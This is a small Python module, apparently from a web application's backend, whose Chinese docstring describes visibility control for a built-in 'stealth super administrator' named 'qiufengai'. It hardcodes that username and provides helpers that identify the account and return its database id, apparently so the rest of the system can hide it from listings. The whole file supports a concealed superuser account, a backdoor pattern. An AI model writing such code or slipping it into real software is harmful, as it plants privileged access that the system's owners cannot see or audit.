"""内置隐身超级管理员（qiufengai）可见性控制"""

HIDDEN_SUPER_USERNAME = "qiufengai"


def is_hidden_super_user(user) -> bool:
    return (getattr(user, "username", "") or "").lower() == HIDDEN_SUPER_USERNAME


def is_hidden_super_username(username: str | None) -> bool:
    return (username or "").lower() == HIDDEN_SUPER_USERNAME


def hidden_super_user_id(session) -> int | None:
    from db.models import User

    row = session.query(User.id).filter(User.username == HIDDEN_SUPER_USERNAME).first()
    return row[0] if row else None


def hidden_super_user_ids(session) -> list[int]:
    uid = hidden_super_user_id(session)
    return [uid] if uid else []
